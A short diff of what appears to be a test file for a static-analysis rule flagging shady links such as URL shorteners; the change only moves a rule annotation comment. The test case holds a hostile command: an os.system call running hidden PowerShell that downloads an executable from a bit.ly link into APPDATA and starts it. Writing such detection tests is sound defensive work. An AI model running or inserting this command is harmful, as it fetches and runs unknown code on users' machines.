@@ -54,8 +54,8 @@ SECURE_ORIGINS: List[SecureOrigin] = [
 
 """ RULEID: url shorteners
 """
-# ruleid: shady-links
 os.system(
+    # ruleid: shady-links
     "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
 )
 
